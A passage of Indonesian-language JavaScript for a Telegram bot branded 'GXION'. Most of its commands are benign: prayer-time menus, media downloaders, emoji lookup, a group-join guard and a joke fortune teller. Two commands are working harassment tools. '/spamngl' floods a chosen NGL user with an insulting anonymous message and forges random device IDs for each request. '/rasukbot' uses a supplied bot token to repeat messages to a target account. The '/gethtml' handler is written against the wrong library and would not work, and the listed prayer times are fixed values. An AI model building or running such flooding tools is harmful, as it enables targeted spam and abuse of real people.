      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const updatedNumbers = activeNumbers.filter(
        (num) => num !== botNumber
      );
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
    }

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 — 𝙎𝙐𝘾𝘾𝙀𝙎𝙎
ID: ${botNumber}
Status: Berhasil di hapus!\`\`\`
`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error(error);

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 — 𝙀𝙍𝙍𝙊𝙍
ID: ${botNumber}
Status: ${error.message}\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }
});

// simpan post terakhir
const lastChannelPost = {};

// ambil setiap ada post baru di channel
bot.on("channel_post", (ctx) => {
  if (!ctx.channelPost) return;

  const chId = ctx.chat.id;
  const msgId = ctx.channelPost.message_id;

  lastChannelPost[chId] = msgId;
  console.log("BERHASIL KETEMU POST DI CHANNEL:", chId, msgId);
});
// ================= TOOLS JADWAL SHOLAT =================

bot.command("jadwalsholat", async (ctx) => {

  return ctx.reply(
`<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT INDONESIA〕━━━╮
┃
┃ Silahkan pilih zona waktu
┃ jadwal sholat yang ingin
┃ anda lihat dibawah ini.
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🌅 WIB",
              callback_data: "sholat_wib",
              style: "success"
            },
            {
              text: "🌄 WITA",
              callback_data: "sholat_wita",
              style: "danger"
            }
          ],
          [
            {
              text: "🌙 WIT",
              callback_data: "sholat_wit",
              style: "primary"
            }
          ]
        ]
      }
    }
  );

});

// ================= BACK MENU =================
bot.action("back_jadwal", async (ctx) => {

  await ctx.answerCbQuery().catch(() => {});

  return ctx.editMessageText(
`<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT 〕━━━╮
┃
┃ Silahkan pilih zona waktu
┃ jadwal sholat yang ingin
┃ anda lihat dibawah ini.
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🌅 WIB",
              callback_data: "sholat_wib",
              style: "success"
            },
            {
              text: "🌄 WITA",
              callback_data: "sholat_wita",
              style: "danger"
            }
          ],
          [
            {
              text: "🌙 WIT",
              callback_data: "sholat_wit",
              style: "primary"
            }
          ]
        ]
      }
    }
  );

});

// ================= WIB =================
bot.action("sholat_wib", async (ctx) => {

  await ctx.answerCbQuery("Membuka jadwal WIB...").catch(() => {});

  return ctx.editMessageText(
`<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT WIB 〕━━━╮
┃
┃ 🌅 Subuh   : 04:30
┃ ☀️ Dzuhur  : 12:00
┃ 🌤 Ashar   : 15:15
┃ 🌇 Maghrib : 17:50
┃ 🌙 Isya    : 19:00
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

𖠋︎ Semoga ibadah anda lancar hari ini.</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "⬅️ BACK",
              callback_data: "back_jadwal",
              style: "danger"
            }
          ]
        ]
      }
    }
  );

});

// ================= WITA =================
bot.action("sholat_wita", async (ctx) => {

  await ctx.answerCbQuery("Membuka jadwal WITA...").catch(() => {});

  return ctx.editMessageText(
`<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT WITA 〕━━━╮
┃
┃ 🌅 Subuh   : 04:45
┃ ☀️ Dzuhur  : 12:15
┃ 🌤 Ashar   : 15:30
┃ 🌇 Maghrib : 18:05
┃ 🌙 Isya    : 19:15
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

𖠋︎ Semoga ibadah anda lancar hari ini.</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "⬅️ BACK",
              callback_data: "back_jadwal",
              style: "danger"
            }
          ]
        ]
      }
    }
  );

});

// ================= WIT =================
bot.action("sholat_wit", async (ctx) => {

  await ctx.answerCbQuery("Membuka jadwal WIT...").catch(() => {});

  return ctx.editMessageText(
`<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT WIT 〕━━━╮
┃
┃ 🌅 Subuh   : 05:00
┃ ☀️ Dzuhur  : 12:30
┃ 🌤 Ashar   : 15:45
┃ 🌇 Maghrib : 18:20
┃ 🌙 Isya    : 19:30
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

𖠋︎ Semoga ibadah anda lancar hari ini.</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "⬅️ BACK",
              callback_data: "back_jadwal",
              style: "danger"
            }
          ]
        ]
      }
    }
  );

});
// command react
bot.command("reactch", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ").slice(1).join("");
    const [emoji, ch] = text.split(",");

    if (!emoji || !ch) {
      return ctx.reply("❌ Contoh: /reactch 🌸,@channel");
    }

    const chat = await ctx.telegram.getChat(ch.trim());
    const chId = chat.id;

    const msgId = lastChannelPost[chId];
    if (!msgId) {
      return ctx.reply("❌ Kirim 1 post baru di channel dulu");
    }

    await ctx.telegram.setMessageReaction(
      chId,
      msgId,
      [{ type: "emoji", emoji: emoji.trim() }]
    );

    ctx.reply("✅ React berhasil");

  } catch (err) {
    console.log("ERROR:", err);
    ctx.reply("❌ Gagal (cek bot join channel)");
  }
});

bot.command("cekemoji", async (ctx) => {
  try {
    const targetMsg = ctx.message?.reply_to_message;

    if (!targetMsg) {
      return ctx.reply(
`<blockquote><tg-emoji emoji-id="5260293700088511294">⛔️</tg-emoji>Reply pesan yang berisi emoji premium.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    const emojis = [];

    // ambil dari text entities
    if (Array.isArray(targetMsg.entities)) {
      for (const entity of targetMsg.entities) {
        if (entity.type === "custom_emoji" && entity.custom_emoji_id) {
          emojis.push({
            id: entity.custom_emoji_id,
            emoji: targetMsg.text?.substring(entity.offset, entity.offset + entity.length) || "❔"
          });
        }
      }
    }

    // ambil dari caption entities
    if (Array.isArray(targetMsg.caption_entities)) {
      for (const entity of targetMsg.caption_entities) {
        if (entity.type === "custom_emoji" && entity.custom_emoji_id) {
          emojis.push({
            id: entity.custom_emoji_id,
            emoji: targetMsg.caption?.substring(entity.offset, entity.offset + entity.length) || "❔"
          });
        }
      }
    }

    if (emojis.length === 0) {
      return ctx.reply(
`<blockquote><tg-emoji emoji-id="5260293700088511294">⛔️</tg-emoji>Tidak ada custom emoji terdeteksi.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    let result = `
<blockquote expandable>
<b><tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji>CUSTOM EMOJI DETECTED</b>

━━━━━━━━━━━━━━━━━━`;

    emojis.forEach((e, i) => {
      result += `

<b>• Emoji ${i + 1}</b>
${e.emoji}
<code>${e.id}</code>

<b><tg-emoji emoji-id="5197269100878907942">✍️</tg-emoji>Format Memakai Di HTML:</b>
<code>&lt;tg-emoji emoji-id="${e.id}"&gt;${e.emoji}&lt;/tg-emoji&gt;</code>

━━━━━━━━━━━━━━━━━━`;
    });

    result += `

<b><tg-emoji emoji-id="4958699241137505132">🎁</tg-emoji>Total Custom Emoji:</b> ${emojis.length}
</blockquote>`;

    return ctx.reply(result, {
      parse_mode: "HTML",
      disable_web_page_preview: true
    });

  } catch (err) {
    console.log(err);

    return ctx.reply(
`<blockquote>
❌ Terjadi error saat membaca emoji.
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.command("restart", async (ctx) => {
  try {
    const teks = `
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙎𝙐𝘾𝘾𝙀𝙎𝙁𝙐𝙇𝙇𝙔
━━━━━━━━━━━━━━━━━━━
⎌ 𝙎𝙚𝙙𝙖𝙣𝙜 𝙈𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙍𝙚𝙨𝙩𝙖𝙧𝙩 𝙊𝙩𝙤𝙢𝙖𝙩𝙞𝙨 𝙋𝙖𝙙𝙖 𝙋𝙖𝙣𝙚𝙡 𝘽𝙖𝙣𝙜... 𝙈𝙤𝙝𝙤𝙣 𝙏𝙪𝙣𝙜𝙜𝙪 𝙎𝙚𝙟𝙚𝙣𝙖𝙠.....
\`\`\`
    `;

    await ctx.reply(teks, { parse_mode: "Markdown" });

    setTimeout(() => {
      process.exit(0);
    }, 2500);

  } catch (err) {
    console.log(err);
    ctx.reply("Gagal restart. Masalah pada Internal Server.");
  }
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});

bot.command('setcd', async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner");

  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");

  if (args[1] === "0") {
    COOLDOWN_TIME = 0;
    COOLDOWN_TEXT = "0s";
    return ctx.reply("✅ Cooldown dimatikan");
  }

  const time = parseCooldown(args[1]);
  if (!time) return ctx.reply("⚠️ Format salah!");

  COOLDOWN_TIME = time;
  COOLDOWN_TEXT = args[1];

  ctx.reply(`✅ Cooldown diubah ke ${COOLDOWN_TEXT}`);
});

bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});


bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Sudah SAFE");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
//// Tools ///
bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Bang GXION`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
 /// ======== COMMAND RASUK BOT BY BAWZH ===========
 bot.command("rasukbot", checkOwner, checkAdmin, async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  if (!args) {
    return ctx.reply(
      "📘 <b>Cara penggunaan command /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    if (reply) {
      const parts = args.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return ctx.reply(
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {

      if (!args.includes("|")) {
        return ctx.reply(
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = args.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.reply(
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.reply(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.reply(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

// ========== COMMAND TIME (WIB, WITA, WIT) ==========
bot.command("time", async (ctx) => {
  const now = new Date();
  
  // WIB (UTC+7)
  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  
  // WITA (UTC+8)
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  
  // WIT (UTC+9)
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));
  
  // Format jam
  const formatJam = (date) => {
    return date.toLocaleTimeString("id-ID", { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      hour12: false
    });
  };
  
  // Format tanggal
  const formatTanggal = (date) => {
    return date.toLocaleDateString("id-ID", { 
      weekday: 'long', 
      day: 'numeric', 
      month: 'long', 
      year: 'numeric' 
    });
  };
  
  const pesan = 
`
<blockquote>
🕐 WAKTU SEKARANG 🕐

┌─────────────────┐
│ 🟢 WIB 
│    ${formatJam(wib)}
│    ${formatTanggal(wib)}
├─────────────────┤
│ 🟡 WITA
│    ${formatJam(wita)}
│    ${formatTanggal(wita)}
├─────────────────┤
│ 🔵 WIT
│    ${formatJam(wit)}
│    ${formatTanggal(wit)}
└─────────────────┘

✨ *Ketikan /start untuk kembali menu utama* ✨
</blockquote>
`;
  
  await ctx.reply(pesan, { parse_mode: "HTML" });
}); 
 
bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("spamngl", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) {
      return ctx.reply("🪧 ☇ Format: /spamngl rainonesday 10");
    }

    const usernameRaw = args[0];
    const username = usernameRaw;
    const amountRaw = args[1];
    const amount = parseInt(amountRaw, 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) {
      return ctx.reply("❌ ☇ Masukan jumlah dan harus berupa angka");
    }

    await ctx.reply(`⏳ ☇ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");

        const message = "WOI DONGO KENAL VINA GA??";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
          body,
        });
      } catch (err) {
      }

      if (i < amount) {
        if (i % 50 === 0) {
          try {
          } catch (e) {}
          await new Promise((r) => setTimeout(r, delay + 200));
        } else {
          await new Promise((r) => setTimeout(r, delay));
        }
      }
    }

    ctx.reply(`✅ ☇ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    console.error(error);
    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("snack", async (ctx) => {
  const text = ctx.message.text;
  const url = text.split(" ")[1];

  if (!url) {
    return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  }

  // validasi link dikit biar ga asal masukin sampah
  if (!url.includes("snackvideo")) {
    return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");
  }

  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");

    const res = await axios.get(
      `https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`,
      { timeout: 15000 } // biar ga ngegantung
    );

    const video = res?.data?.data?.video;

    if (!video) {
      return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");
    }

    await ctx.replyWithVideo(
      { url: video },
      {
        caption: "✅ Beres. Udah, jangan spam lagi"
      }
    );

  } catch (err) {
    console.log("ERROR:", err.message);

    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh\n- Internet lu kentang");
  }
});

bot.command(/\/gethtml(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = (match[1] || "").trim();

  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(
      chatId,
      "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil source code dari URL...");

    const res = await axios.get(url, { responseType: "text", timeout: 30000 });
    const html = res.data;

    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    await bot.sendDocument(chatId, filePath, {}, { filename: "source_code.html", contentType: "text/html" });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ *Terjadi kesalahan:*\n\`${err.message}\``, { parse_mode: "Markdown" });
  }
});

// ========== CATBOX DOWNLOADER (VERSI SIMPLE) ==========

bot.command("catbox", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const url = args[1];
  
  if (!url) {
    return ctx.reply(
`📥 *DOWNLOAD CATBOX* 📥

*Cara pakai:*
/catbox https://files.catbox.moe/xxxxx.jpg

*Support file:*
Gambar, Video, Audio, Dokumen

📌 *Maksimal file: 50MB*`,
      { parse_mode: "Markdown" }
    );
  }
  
  if (!url.includes('files.catbox.moe')) {
    return ctx.reply("❌ Bukan URL Catbox yang valid!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengunduh file...*", { parse_mode: "Markdown" });
  
  try {
    // Kirim langsung pake URL
    const ext = url.split('.').pop().toLowerCase();
    
    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
      await ctx.replyWithPhoto(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) {
      await ctx.replyWithVideo(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp3', 'wav', 'ogg'].includes(ext)) {
      await ctx.replyWithAudio(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else {
      await ctx.replyWithDocument(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    }
  } catch (err) {
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", { parse_mode: "Markdown" });
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

// ========== CEK MASA DEPAN ==========
bot.command("cekmasadepan", async (ctx) => {
  let targetName = "Kamu";
  
  // Cek apakah reply ke pesan orang
  if (ctx.message.reply_to_message) {
    const target = ctx.message.reply_to_message.from;
    targetName = target.first_name || "Dia";
  } else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) {
      targetName = args.slice(1).join(" ");
    }
  }
  
  // Data random
  const profesi = [
    "Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", 
    "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚",
    "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️",
    "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"
  ];
  
  const kekayaan = [
    "Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵",
    "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎",
    "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"
  ];
  
  const jodoh = [
    "Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸",
    "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊",
    "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"
  ];
  
  const rumah = [
    "Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️",
    "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️",
    "Rumah Impian ✨", "Kontrakan Dulu 😅"
  ];
  
  const kendaraan = [
    "Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡",
    "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️",
    "Helikopter Pribadi 🚁", "Naik Angkot 😂"
  ];
  
  const nasib = [
    "Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧",
    "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨",
    "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"
  ];
  
  // Random pilih
  const hasilProfesi = profesi[Math.floor(Math.random() * profesi.length)];
  const hasilKekayaan = kekayaan[Math.floor(Math.random() * kekayaan.length)];
  const hasilJodoh = jodoh[Math.floor(Math.random() * jodoh.length)];
  const hasilRumah = rumah[Math.floor(Math.random() * rumah.length)];
  const hasilKendaraan = kendaraan[Math.floor(Math.random() * kendaraan.length)];
  const hasilNasib = nasib[Math.floor(Math.random() * nasib.length)];
  
  const pesan = 
`
<blockquote>
🔮 RAMALAN MASA DEPAN 🔮
Untuk: ${targetName}

━━━━━━━━━━━━━━━━━━━━━━

👔 Profesi: ${hasilProfesi}
💰 Kekayaan: ${hasilKekayaan}
❤️ Jodoh: ${hasilJodoh}
🏠 Rumah: ${hasilRumah}
🚗 Kendaraan: ${hasilKendaraan}
🍀 Nasib:  ${hasilNasib}

━━━━━━━━━━━━━━━━━━━━━━
✨ Hasil ini hanya hiburan ya!
💪 Masa depan ada di tanganmu sendiri!

🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>`;

  ctx.reply(pesan, { parse_mode: "HTML" });
});

// COMMAND SINGKAT (opsional)
bot.command("ramal", async (ctx) => {
  const args = ctx.message.text.split(" ");
  let nama = "Kamu";
  if (args.length > 1) nama = args.slice(1).join(" ");
  
  const hasil = [
    "Sukses besar di usia 30an! 🎉",
    "Jadi pengusaha terkenal! 🏢",
    "Punya pasangan idaman! ❤️",
    "Hidup bahagia sampai tua! 😊",
    "Bisa beli rumah mewah! 🏰",
    "Keliling dunia bareng keluarga! 🌍",
    "Jadi orang yang bermanfaat! ✨"
  ];
  
  const random = hasil[Math.floor(Math.random() * hasil.length)];
